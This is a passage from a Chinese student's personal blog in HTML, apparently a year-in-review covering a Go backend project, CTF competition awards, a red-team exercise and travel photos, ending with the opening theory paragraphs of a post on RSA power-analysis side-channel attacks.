+ 1.   王子负责算法端，毕师傅负责前端，我负责后端（当然还有安全，SQL注入、反序列化之类的漏洞我都考虑到了，毕竟做了很长时间的Web安全）
+
+ ### 我的工作
+
+ 1.   用Golang开发后端，Gin框架，管理员和普通用户的增删改查、权限分配都做得比较完善，对接算法端和前端
+
+ 2.   ![项目架构简图](https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20240111013425.png)
+
+ 3.   SQL原生语句和Gorm同时使用操作数据库
+
+ 4.   使用MySQL搭建数据库，同时需要对存取不是很频繁但是需要频繁分析的数据，我存到了hive中，数据库中存了管理员和普通用户的信息、视频流相关信息、分析结果等等，可以提供很完善的日志
+
+ 5.   搭建基于MQTT的EMQX服务器，实现了前后端之间的实时数据传输（项目的第一版，毕师傅发现前端请求后端分析出的数据延迟很高，肉眼可见的那种高，我们就讨论了很多种方案，最后刘老师提议搭MQTT服务器，只是提出来了想法，我就硬着头皮做，真实现了，嘻嘻...）
+
+ 6.   分布式计算：Hadoop建了很多slave节点同时分析视频流，实现了完全分布式（我们三个一个人手里都有一两台轻量级云服务器）
+
+ 7.   视频流服务器：用Darwin搭了个推流和接收视频流的服务器，可以直接对接实体摄像头
+
+ 8.   转码服务器：因为算法端需要flv流，我就搭了个ffmpeg转码服务器，把实体摄像头的rtsp流转成了flv流
+
+      ### 部分补充
+
+      1.   为什么使用Golang作为后端语言：首先，我考虑到了项目需要多路视频同时分析的多线程高并发的需求，Go语言通过并发编程和轻量级的协程（goroutine）机制，提供了高效的并发处理能力。它内置了并发原语（如通道和互斥锁），简化了并发编程的复杂性，使该项目支持高性能的轻量级并发
+      2.   为什么没用Java或者python，第一，该项目后端只有我一个人，Java的开发代码冗余量太大，不方便实现多线程高并发，但是我是Java转Go，Spring全家桶我也学得比较通，如果项目组人多，Java也未尝不可；第二，python真的很慢，很慢很慢，不能实现项目的实时性
+
+ 
+
+ ### 获奖证书
+
+ 1.   ![](https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20240111011333.png)
+ 2.   ![](https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20240111011348.png)
+ 3.   ![](https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20240111011355.png)
+ 4.   ![](https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20240111011405.png)
+ 5.   ![](https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20240111011412.png)
+ 6.   ![](https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20240111035329.png)
+</code></pre>
+<h2 id="安全——CTF"><a href="#安全——CTF" class="headerlink" title="安全——CTF"></a>安全——CTF</h2><h3 id="闲聊"><a href="#闲聊" class="headerlink" title="闲聊"></a>闲聊</h3><ol>
+<li><p>  大一进CTF实验室，到2023年才开始拿奖，沉淀了很长时间，ctfshow、bugku、攻防世界都有我刷题的记录</p>
+</li>
+<li><p>  很荣幸能进CTF实验室，能够认识队友毕师傅和王子，能够认识佳琪哥等等大佬，有大佬带着打比赛</p>
+</li>
+<li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/d220be779b37e62d1d78ad1ae82b156.jpg" alt="实验室还没搬迁的时候我和队友的合照"></p>
+</li>
+<li><p>  打线下赛认识很多朋友，有电子科大的两位网安学院的师哥，有曲阜校区的兄弟们，还有很多校外的大佬等等</p>
+</li>
+<li><p>  打线下赛到处旅游，这一年先后去了合肥、哈尔滨、济南、北京</p>
+</li>
+<li><p><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/0da71be22dadea9ca57c743ed7a9b38.jpg"></p>
+<h3 id="全国大学生信息安全与对抗技术竞赛"><a href="#全国大学生信息安全与对抗技术竞赛" class="headerlink" title="全国大学生信息安全与对抗技术竞赛"></a>全国大学生信息安全与对抗技术竞赛</h3><ol>
+<li>  国家一等奖，学校科创奖励15个科创分，大概7000块钱，很nice，小半年房租</li>
+<li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/a4150b0539fbb15174a3d0534697315.jpg"></li>
+<li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/17faa583c638cacf9f3c2b0bf00720c.jpg"></li>
+</ol>
+</li>
+</ol>
+<h3 id="ciscn"><a href="#ciscn" class="headerlink" title="ciscn"></a>ciscn</h3><ol>
+<li>  ciscn是第一次能够接触的线下赛，大一下止步线上初赛，大二终于可以去线下打（旅游）了</li>
+<li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/0fd3beecf700c06c21f47931d7835e0.jpg" alt="线上初赛成绩"></li>
+<li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/faaf7ec85302a6791d85bfcb3e503ea.jpg"></li>
+<li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/c3fad4766c7a93f2ce747ab4dc19a49.jpg"></li>
+<li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/27644b0c5eb80f0a81d2738efa36ebc.jpg" alt="毕师傅的帅照，有小姑娘追的那种"></li>
+<li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/d2c92ec4f15e7fc18b45693251d99a7.jpg"><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/1a3592fdabceac5a462eab057950ce3.jpg"></li>
+<li>  第一次打AWDP赛制，整个队只有我一个人做出来题了。。。</li>
+<li>  在合肥工业大学举办，去合肥转了转，看到了江苏卫视的大楼和国防科大的电子对抗学院（往前推两年是在这举办的）</li>
+<li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/c232fda8b0d3655ef5dc3b6d512adc6.jpg"></li>
+<li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/9922fab47c6c777cc1946cf1910026f.jpg"></li>
+<li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/3c8c918cb51d65abda47a658cbb6675.jpg"></li>
+<li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/4326988a902d3fc85cb6eff1c465852.jpg"></li>
+<li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/87dc9795e6df2150fdba858a12aa92b.jpg"></li>
+<li>  前一天晚上熬夜打了场awd——bugku，之前准备的通防fix都会被查，mmp</li>
+<li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/80da4bc4d778a9aaf390e3f03e08e3c.jpg"></li>
+<li>  能见到保研到中海洋的超哥，DebuGGer战队的创始人之一，我记得之前在实验室坐在我右边的右边，可以算是同窗一年，嘻嘻…</li>
+<li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/73b22055c82105b937df97d70495208.jpg"></li>
+</ol>
+<h3 id="蓝帽杯"><a href="#蓝帽杯" class="headerlink" title="蓝帽杯"></a>蓝帽杯</h3><ol>
+<li>  最开始打蓝帽杯是2022年，当时线上初赛就止步了，比较遗憾，当时真的是处处碰壁，不只是蓝帽杯，强网杯、网鼎杯之类的都没有晋级</li>
+<li>  今年是一路杀到总决赛，拿到国家三等奖</li>
+<li>  好像所有的CTF比赛都没区分本科生和研究生，遇到了曲阜校区CTF实验室创始人王师哥，目前已经是电子科大博士，能够同台竞技很荣幸，压力也很大</li>
+</ol>
+<h4 id="半决赛——成功晋级"><a href="#半决赛——成功晋级" class="headerlink" title="半决赛——成功晋级"></a>半决赛——成功晋级</h4><ol>
+<li><p>  赛场看起来比较豪华</p>
+</li>
+<li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/0320e135e6889331b2079e51a98fdbe.jpg"></p>
+</li>
+<li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/64b6fad07cad5f97d550cd6d2c39007.jpg"></p>
+</li>
+<li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/b78392158563e8f98c4ecde13784416.jpg"></p>
+</li>
+<li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/fa5402f3e74dcd7041bbb6f2555f3a4.jpg"></p>
+</li>
+<li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/47ffe70611e78c41eaa09b93d305f33.jpg"></p>
+</li>
+<li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/7033092b2784aeeb90a78efd594a315.jpg"></p>
+</li>
+<li><p>  半决赛是在哈工大举行的，有幸逛了逛有核弹发射能力的高校</p>
+</li>
+<li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/ac9a3b15a1f8969ebd7bd166f755740.jpg"></p>
+</li>
+<li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/e625643b8a1012c38c011068e079a85.jpg"></p>
+</li>
+<li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/611cfc85034da91f78de91dc9ea4f57.jpg"></p>
+</li>
+<li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/1965e172cf1080dafc9b96bcbbb2d1c.jpg"></p>
+</li>
+<li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/0f263b0546f1935df4c45f766cc7e2f.jpg"></p>
+</li>
+<li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/91dfa9bf52afd2033f919df19c99b53.jpg"></p>
+</li>
+<li><p>  坐灰机去的，美丽的日落</p>
+</li>
+<li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/51473c35255a34e249324a4f150bd44.jpg"></p>
+</li>
+<li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/c1f08f547c70a1d0b381fc611d54e77.jpg"></p>
+</li>
+<li><p>  作为一个山东人，来一次哈尔滨真的很不容易，就去和平大街之类的景点逛了逛</p>
+</li>
+<li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/ee68203d70e2cad1cacb68f6425c590.jpg"></p>
+</li>
+<li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/7fb088f7e60b6200661988e15017822.jpg"></p>
+</li>
+<li><p><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/c95c9ca7bff5d7518ea8b9e43ef8f3b.jpg" alt="正宗的格瓦斯，和超市买的那种真的不一样奥"></p>
+<h4 id="总决赛——三等奖"><a href="#总决赛——三等奖" class="headerlink" title="总决赛——三等奖"></a>总决赛——三等奖</h4><ol>
+<li>  所有人的合照</li>
+<li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/92da6b4e20fbe5179f3333ef828bf3a.jpg"></li>
+<li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/ce9f2481c5c85031fb5e3f1f0596bd1.jpg" alt="拿奖后大家都很开心"></li>
+<li>  队伍介绍</li>
+<li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/0a78b8c4f279467b102256a3dd1ab28.jpg"></li>
+<li>  赛场大屏很帅，刘老师很happy，站C位</li>
+<li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/545a13ecc2a5d9a338a618deed87a56.jpg"></li>
+<li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/76d66219ea2b4d27e47f1857db3cdd2.jpg"></li>
+<li>  我们拿到了三等奖</li>
+<li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/c73fd7fa433521010d976c2d597028a.jpg"></li>
+<li>  佳琪哥他们拿到了二等奖</li>
+<li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/447360addd30331b873cd0f5a8ab4ac.jpg"></li>
+<li>  发了个壳子又收上去了，因为需要部里盖章，时间比较长，到现在还没发下来证书</li>
+<li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/a72ecb89f913c55f93b117e0fe47372.jpg"></li>
+<li>  组委会还给发了伴手礼，开出来奇安信的小老虎，后来去奇安信总部参观要88块钱一个</li>
+<li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/9f40174029ae016caa3f26eeab09396.jpg"></li>
+<li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/e4cc8c4743acb1aba33a0e0239cd5f5.jpg"></li>
+<li>  鄙人帅照</li>
+<li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/17ca4bb2fd90fce5fe1ed7571360d56.jpg" alt="鄙人帅照"></li>
+<li>  比完赛能去组委会奇安信总部逛逛，组委会大静姐给大家照了张合影</li>
+<li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/9c9b5ec0535a14b74e9e7829b8c453d.jpg"></li>
+<li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/2ec69fdc535fe3f1d9517280bcbe581.jpg"></li>
+<li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/be96b62bcd1b97c464106d45e0c2448.jpg"></li>
+<li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/a28dd61cb0a9a27905c519c68d54670.jpg"></li>
+<li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/978a792cd544531a4b33e9693d23e51.jpg"></li>
+<li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/bd4d82a286b5133834104735abf4b09.jpg"></li>
+<li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/0e785f76898a97306c7e3c4558a4315.jpg"></li>
+<li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/b27028988d8fde900dee8afb7a52905.jpg"></li>
+<li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/1149a004e0fcf0de8352ead32318bc7.jpg"></li>
+<li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/4dbfcd31f3adc7ad8bc4d1665887bb2.jpg" alt="前面有个大屏，放完会从中间打开，很赛博朋克"></li>
+<li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/d0ecb85aca803c83254f1254faf9241.jpg" alt="态势感知大屏"></li>
+<li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/cfee16acb8ad2f688ad5a792cb1ba4f.jpg" alt="看起来很厉害的亚子，不愧是网安一哥"></li>
+<li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/bff314528c210e57b843d92bfb795a2.jpg"></li>
+<li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/cf34cfe2a543a661541c17ca3504a15.jpg"></li>
+<li>  顺便去看了场升旗，真的是一夜没睡啊，半夜去排队，还排错了，预约的西直门，去的东直门，不过好像预约就能进，不区分通道</li>
+<li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/c6a4d8ddf3c2b52f3eb8a25232b4634.jpg"></li>
+<li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/e6003e2572ee2ae35bd7a522b41c01d.jpg"></li>
+<li>  去了趟天坛，走的时候和队友说有一种似曾相识的感觉，因为德州和北京离得很近，来过很多次了</li>
+<li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/8d834d13678059f7fca3eeb34f11a13.jpg"></li>
+<li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/ca4356af31dcea92e63aec61939d4d5.jpg"></li>
+</ol>
+<h3 id="山东省省赛——科来杯"><a href="#山东省省赛——科来杯" class="headerlink" title="山东省省赛——科来杯"></a>山东省省赛——科来杯</h3><ol>
+<li>  拿到了团队三等奖和队伍里唯一一个个人奖——个人三等奖</li>
+<li>  实战题分数比很多个人二等奖都高，但是理论题没答好，比赛前准备的题库不行，否则也是二等奖，奖金直接从2k缩水到500</li>
+<li>  不过第一次线下赛个人收获三血，感觉自己起飞了</li>
+<li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E4%B8%AA%E4%BA%BA%E4%B8%89%E7%AD%89%E5%A5%96.jpg"></li>
+<li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%9B%A2%E9%98%9F%E4%B8%89%E7%AD%89%E5%A5%96.jpg"></li>
+<li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20240111035246.png"></li>
+<li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/843b830b57a5431a87277cb89af6a8a.jpg"></li>
+<li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/07dcd261094d2281d2d12d682ffc19f.jpg"></li>
+<li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/64d633872a9bf221b87fc7b8a4640b3.jpg"></li>
+<li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/61dc14979972ca7e38369eac8be0a90.jpg"></li>
+<li>  因为比赛是在山警举办，来找张sir（不能再叫der哥了），张sir演出闭幕式，穿警服的样子很帅捏</li>
+<li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/f098470d092baf3f81a0318ba649a17.jpg"></li>
+<li>  比赛场地</li>
+<li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/c22fa87d6cd8c0e26c12b0817e1e644.jpg"></li>
+<li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/b4feb34bb2fec10066ca897ecdc37a2.jpg"></li>
+<li>  组委会有钱，水和饭票之类的都是定制的</li>
+<li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/d7aa347ee448f1a55e2430da77817af.jpg"></li>
+</ol>
+<h3 id="山东省科技节——网安赛道"><a href="#山东省科技节——网安赛道" class="headerlink" title="山东省科技节——网安赛道"></a>山东省科技节——网安赛道</h3><ol>
+<li>  省级二等奖，这应该是我CTF生涯中的第一个奖</li>
+<li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/cd7ec1a98f7073103123e68f0d451e9.jpg"></li>
+<li>  比赛中的golang语言的iris框架的ssrf漏洞现在还记忆清晰，很新颖，但是还是做出来了</li>
+</ol>
+</li>
+</ol>
+<h2 id="省政府奖学金"><a href="#省政府奖学金" class="headerlink" title="省政府奖学金"></a>省政府奖学金</h2><ol>
+<li>  学院里把我推上去竞争省政府奖学金</li>
+<li>  一共推了三个人，20级佳琪哥（20级，DebuGGer战队大哥）、许师哥（21级，ACM大哥），还有菜菜的我</li>
+<li>  最后答辩的时候太紧张了，三分钟的答辩中间好像楞了得半分钟，什么都没说出来，答辩分数很低，遗憾错失省政府奖学金，6k，还浪费了学院3个名额中的一个</li>
+<li>  人生中第一次穿西服，还是借的</li>
+<li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/70a14226caca5dfc2f46ecc0b276a15.jpg"></li>
+<li>  导员最后找我谈话，也因为错失省政府奖学金、浪费学院一个名额不太高兴，让我明年竞争国家奖学金别再出这种岔子</li>
+</ol>
+<h2 id="表彰大会"><a href="#表彰大会" class="headerlink" title="表彰大会"></a>表彰大会</h2><ol>
+<li>  学院里开了个表彰大会，又借了一次西服，感觉穿起来很帅</li>
+<li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/45c3d16e3a7526be401c4b2afd5dd75.jpg"></li>
+</ol>
+<h2 id="攻防演练"><a href="#攻防演练" class="headerlink" title="攻防演练"></a>攻防演练</h2><ol>
+<li>  第一次打攻防演练的红队，最开始真的很坐牢，不过有大佬带，最后的结果还是很好的</li>
+<li>  队友比我小一岁，19岁，高中毕业直接全职某中厂，技术很好，全场最高分，比很多机关单位派出的代表队都高</li>
+<li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20240111035631.png"></li>
+<li></li>
+</ol>
+<h2 id="旅游"><a href="#旅游" class="headerlink" title="旅游"></a>旅游</h2><h3 id="青岛漫展"><a href="#青岛漫展" class="headerlink" title="青岛漫展"></a>青岛漫展</h3><ol>
+<li>  和兄弟们去了趟漫展，看到了很多漂亮的coser，就喜欢小姐姐，嘿嘿…</li>
+<li>  还有，卡面来打和铠甲勇士真的很帅</li>
+<li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/d5b50e3920e29a641ba2363edaafab6.jpg"></li>
+<li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/affbe6ba2ede6ea6e92f531c3bfebe5.jpg"></li>
+<li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/f67d234d4185ec495dad20637e48526.jpg"></li>
+<li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/c036db2b3bf6c496dfbfa2afb7e45d5.jpg"></li>
+<li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20e3e7fbd67a5033b98d25da05d11eb.jpg"></li>
+<li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/806a032d3ff900a7f588aa459feaaac.jpg"></li>
+<li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/dee7bb1bc5443c9b1135a67fe5292bf.jpg"></li>
+<li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/80e44476af6810b6c051367bec10d74.jpg"></li>
+<li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/f7bba1f9c5441e2b34abcc0a3111edc.jpg"></li>
+<li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/c6afc2b13ba78b3e06e4a381841bfae.jpg"></li>
+<li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/c7d025df23b49957200d1552a85c19a.jpg"></li>
+<li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/00341d3c0d6d5dff5a7735d8ca467d6.jpg"></li>
+<li>  第一次玩卡面来打的腰带，好带劲</li>
+<li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/6da9c8169f97e2924cf07a268fcff71.jpg"></li>
+<li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/536f41eda2cdd865931ea93a0937a0c.jpg"></li>
+</ol>
+<h3 id="崂山"><a href="#崂山" class="headerlink" title="崂山"></a>崂山</h3><ol>
+<li><p>  五一假期期间和兄弟们一起爬了次崂山，差点没累死在半山腰</p>
+</li>
+<li><p>  上山前带的食物和水不多，中途消耗完了，但是直到最后也没在山上花一分钱，主打一个特种兵大学生</p>
+</li>
+<li><p>  还有满满的基情</p>
+</li>
+<li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/a53f3f68d2ca27c28bc690eb9333b2c.jpg"></p>
+</li>
+<li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/956616b492025e7daa7c26697066f36.jpg"></p>
+</li>
+<li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/b6b2e5d9c65b91aab7152106cea2db6.jpg"></p>
+</li>
+<li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/1b4b653e42fef8344912efd9528fb59.jpg"></p>
+</li>
+<li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/f0fbdf188fdd7786a95ccd57a6de5bc.jpg"></p>
+</li>
+<li><p><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/c69c7115c9894ad6c57db8e8c58d135.jpg"></p>
+</li>
+<li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/aa5179a300ffe106d5d6ba8ce64c501.jpg"></p>
+</li>
+<li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/64ada880a3a67954575011ec5fbaa21.jpg"></p>
+</li>
+<li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/f98c842f534c10b16f58353edf011bc.jpg"></p>
+</li>
+<li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/bfcf11044ac663c4a36076993be0d7f.jpg"></p>
+</li>
+<li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/db86440f35212e72b5b9cb2f3b23d07.jpg"></p>
+</li>
+<li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/e86efdee5323dacec1538d4d88d8cfb.jpg"></p>
+</li>
+<li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/649a932becd61a67e96635130fc7ca1.jpg"></p>
+</li>
+<li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/26058971169d756d62d382e6c3878a9.jpg"></p>
+</li>
+</ol>
+<h3 id="青岛的其它地方"><a href="#青岛的其它地方" class="headerlink" title="青岛的其它地方"></a>青岛的其它地方</h3><ol>
+<li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/c2014e86949185a79bf1b8758570cbb.jpg"></li>
+<li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/00101c70a4f30a2852ed26c1e85974f.jpg"></li>
+<li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/6be733c478d1f88129397f8838752fd.jpg"></li>
+<li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/15eb10068e05c5a5dcdb08cea5c7fc7.jpg"></li>
+<li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/5eb9daf182f26506e914a2086e09367.jpg"></li>
+</ol>
+<h3 id="避暑山庄"><a href="#避暑山庄" class="headerlink" title="避暑山庄"></a>避暑山庄</h3><ol>
+<li>  暑假和家人们一起去了趟避暑山庄，景色很漂亮</li>
+<li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/05e395ea6b1ed067d67bcc6eead130e.jpg"></li>
+<li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/10e5e84b6675f596bf3f954ffbecf47.jpg"></li>
+<li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/16b360e8f6ed68f962a3f04ec572bf8.jpg"></li>
+<li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/e7ba3f49fe18e5aee8582dcc70e945c.jpg"></li>
+<li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/c69490ae1333200f6361c3d4941cc1d.jpg"></li>
+<li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/b680e54840de3301ecaab412ad0b1d7.jpg"></li>
+</ol>
+<h3 id="内蒙古草原"><a href="#内蒙古草原" class="headerlink" title="内蒙古草原"></a>内蒙古草原</h3><ol>
+<li>  天很蓝，空气很清新，给人一种心旷神怡的感觉</li>
+<li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/401240bedea46ca744541723a4a34f6.jpg"></li>
+<li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/e4e31211921fd92959d8f6202513a53.jpg"></li>
+<li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/37421fc8fe8e2b32c483af48cc59299.jpg"></li>
+<li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/8edd064d700c0050df7282e19f3432c.jpg"></li>
+<li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/d4e8fdf381fea72b06c7db991dacaa4.jpg"></li>
+<li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/6093dab9f7a85cb80cb04dfcf8bb215.jpg"></li>
+<li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/29d8ddddb52f9ddcd3a870f86969ac6.jpg"></li>
+<li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/77ff49925c50b50f20948c0aa5b9a77.jpg"></li>
+<li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/65aa47b71382fd9263197fcdc01bc85.jpg"></li>
+<li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/b8a49289dcf9f001fa832091d19973b.jpg"></li>
+</ol>
+
+        </div>
+    
+
+</div>
+            
+                
+<div class="post">
+
+    <div class="post-header index">
+        <h1 class="title">
+            <a href="/%E4%BE%A7%E4%BF%A1%E9%81%93%E6%94%BB%E5%87%BB/">
+                侧信道攻击
+            </a>
+        </h1>
+        <div class="post-info">
+            
+                <span class="date">2023-09-26</span>
+            
+            
+                <a href="http://dezhoutorizhao.github.io/%E4%BE%A7%E4%BF%A1%E9%81%93%E6%94%BB%E5%87%BB/#disqus_thread" class="comments article-comment-link">留言</a>
+            
+            
+                <span class="category">
+                    <a href="/categories/CTF/">CTF</a>
+                </span>
+            
+        </div>
+    </div>
+
+    
+        <div class="content">
+            <h1 id="RSA侧信道攻击"><a href="#RSA侧信道攻击" class="headerlink" title="RSA侧信道攻击"></a>RSA侧信道攻击</h1><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><ol>
+<li>  能量分析攻击（侧信道攻击）是一种能够从密码设备中获取秘密信息的密码攻击方法．</li>
+<li>  与其 他攻击方法不同：这种攻击利用的是密码设备的<strong>能量消耗特征</strong>，而非密码算法的数学特性．</li>
+<li>  能量分析攻击是一种非入侵式攻击，攻击者可以方便地购买实施攻击所需要的设备：所以这种攻击对智能卡之类的密码设备的安全性造成了严重威胁。</li>
+</ol>
+<h2 id="攻击条件"><a href="#攻击条件" class="headerlink" title="攻击条件"></a>攻击条件</h2><ol>
+<li>  攻击者可获取与加解密相关的侧信道信息，例如能量消耗、运算时间、电磁辐射等等。</li>
+</ol>
+<h2 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h2><ol>
